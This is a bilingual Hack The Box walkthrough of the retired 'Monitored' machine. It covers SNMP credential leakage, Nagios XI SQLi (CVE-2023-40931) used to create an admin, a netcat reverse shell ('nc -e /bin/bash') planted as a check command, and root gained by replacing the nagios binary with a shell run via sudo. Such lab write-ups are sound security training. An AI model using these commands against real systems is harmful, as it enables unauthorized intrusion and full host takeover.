# Monitored [Medium]

> **ES:** Máquina Linux media con Nagios XI: credenciales vía SNMP, SQLi para escalar a admin y RCE con comandos, más abuso de sudo para root.
> **EN:** Medium Linux machine with Nagios XI: credentials via SNMP, SQLi to admin and command-based RCE, plus sudo abuse to root.

| Campo | Valor |
|-------|-------|
| **Dificultad** | Medium |
| **OS** | Linux |
| **Estado** | Retired |
| **Maker** | TheCyberGeek & ruycr4ft |
| **URL** | https://app.hackthebox.com/machines/Monitored |
| **IP lab** | 10.10.11.248 |
| **Fecha de resolución** | 2026-09-24 |

---

## 🎯 Objetivo / Goal

> **ES:** Conseguir `user.txt` y `root.txt` vía SNMP → API Nagios → SQLi CVE-2023-40931 → RCE como `nagios`, y abuso de scripts con sudo.
> **EN:** Get `user.txt` and `root.txt` via SNMP → Nagios API → SQLi CVE-2023-40931 → RCE as `nagios`, and sudo script abuse.

---

## 🛠️ Herramientas usadas / Tools used

- [ ] nmap (TCP + UDP/SNMP 161)
- [ ] snmpwalk / onesixtyone
- [ ] curl (API `nagiosxi/api/v1/authenticate`)
- [ ] sqlmap / Burp (SQLi en `banner_message-ajaxhelper.php`)
- [ ] nc / pwncat-cs (reverse shell)
- [ ] sudo -l + análisis de `manage_services.sh` / `nagios`

---

## 📋 Pasos / Steps

### Paso 1 — Reconocimiento / Recon

> **ES:** Escaneo TCP/UDP y registro de `nagios.monitored.htb` en `/etc/hosts`.
> **EN:** TCP/UDP scan and registering `nagios.monitored.htb` in `/etc/hosts`.

```bash
nmap -sC -sV -oN nmap_init 10.10.11.248
nmap -sU --top-ports 50 10.10.11.248  # UDP: SNMP 161
echo "10.10.11.248 nagios.monitored.htb monitored.htb" | sudo tee -a /etc/hosts
```

**Resultado / Result:** 22/tcp SSH, 80/443/tcp Apache 2.4.56 (Nagios XI), 389/tcp LDAP, 5667/tcp, UDP 161 SNMP.

---

### Paso 2 — Enumeración / Enumeration

> **ES:** SNMP expone parámetros con usuario/clave (`svc:...`); con la API se obtiene `auth_token` de una cuenta y se confirma SQLi CVE-2023-40931.
> **EN:** SNMP exposes parameters with user/password (`svc:...`); the API yields an `auth_token` and confirms SQLi CVE-2023-40931.

```bash
snmpwalk -v2c -c public 10.10.11.248
TOKEN=$(curl -ksX POST https://nagios.monitored.htb/nagiosxi/api/v1/authenticate -d "username=svc&password=<pass>&valid_min=500" | awk -F'"' '{print $12}')
echo "$TOKEN"
# Imágenes locales preservadas: img/image_20240132-123225.png, img/image_20240104-130436.png
```

**Resultado / Result:** Credencial SNMP válida + token API; endpoint `/nagiosxi/admin/banner_message-ajaxhelper.php` inyectable (`id`).

---

### Paso 3 — Acceso inicial (foothold) / Initial access

> **ES:** Con la SQLi se extrae la API key de admin, se crea un admin, y desde `Configure → Commands/Services` se ejecuta un check malicioso con reverse shell.
> **EN:** Via SQLi extract the admin API key, create an admin, then from `Configure → Commands/Services` run a malicious check with a reverse shell.

```bash
nc -lvnp 9999 &
# sqlmap contra banner_message-ajaxhelper.php?action=acknowledge_banner_message&id=3&token=$TOKEN
# crear admin con la API key, login web, Command = nc -e /bin/bash <tu-ip> 9999
# Monitoring -> Services -> Add New -> Run Check Command
```

**Resultado / Result:** Reverse shell como `nagios`.

---

### Paso 4 — Usuario (user.txt) / User

> **ES:** Lectura directa del flag con el contexto `nagios`.
> **EN:** Direct flag read with the `nagios` context.

```bash
whoami  # nagios
cat ~/user.txt  # formato: 5a94... / 213b... (ofuscado según nota)
```

**Resultado / Result:** `user.txt` obtenido (sin pegar flag completa).

---

### Paso 5 — Root (root.txt) / Privilege escalation

> **ES:** `sudo -l` permite scripts de Nagios XI como root (`manage_services.sh`, `.../nagios`, `backup_xi.sh`, etc.); se troyaniza el binario/servicio y se ejecuta con sudo.
> **EN:** `sudo -l` allows Nagios XI scripts as root (`manage_services.sh`, `.../nagios`, `backup_xi.sh`, etc.); trojanize the binary/service and run it with sudo.

```bash
sudo -l
# (root) NOPASSWD: .../manage_services.sh *, .../nagios start|stop|restart|..., backup_xi.sh *, ...
mv /usr/local/nagios/bin/nagios /usr/local/nagios/bin/nagios.backup
printf '#!/bin/bash\nbash -p\n' > /usr/local/nagios/bin/nagios
chmod +x /usr/local/nagios/bin/nagios
sudo /usr/local/nagiosxi/scripts/manage_services.sh start nagios
cat /root/root.txt  # formato parcial ofuscado
```

**Resultado / Result:** Técnica: sudo sobre scripts/binarios de Nagios XI (secuestro de servicio).

---

## 🧠 Lo aprendido / Learned

> **ES:** SNMP como fuente de credenciales, SQLi autenticada en Nagios XI y privesc por sudo laxo en scripts de servicio.
> **EN:** SNMP as a credential source, authenticated SQLi in Nagios XI, and privesc via lax sudo on service scripts.

- [ ] Enum SNMP + API de Nagios XI y SQLi CVE-2023-40931 (`banner_message-ajaxhelper.php`)
- [ ] RCE vía Commands/Services y abuso de `sudo manage_services.sh`

---

## 📚 Fuentes y Referencias / Sources

- **Fuente:** Nota local `Soluciones/Machines/unclasified/Monitored/index.md` (notas propias en chino/inglés, con capturas en `img/`) — randark/nota migrada
- **Walkthrough de referencia:** Monitored (Medium) | Hack The Box — https://www.hackthebox.com/machines/monitored — HackTheBox (makers: TheCyberGeek & ruycr4ft)
- **Walkthrough de referencia:** HackTheBox | Monitored — https://benheater.com/hackthebox-monitored — 0xBEN
- **Fecha de acceso:** 2026-09-24
- **Autor de este walkthrough:** Apuromafo (contenido propio salvo cita; migración y normalización de la nota local, paráfrasis sin copiar literal ni publicar flags completas)

---

## ⚠️ Aviso Legal / Disclaimer

> **ES:** Uso educativo y personal únicamente. No afiliado a HackTheBox. No publicar flags de máquinas activas.
> **EN:** Educational and personal use only. Not affiliated with HackTheBox. Do not publish flags of active machines.

_Fecha de edición: 2026-09-24_
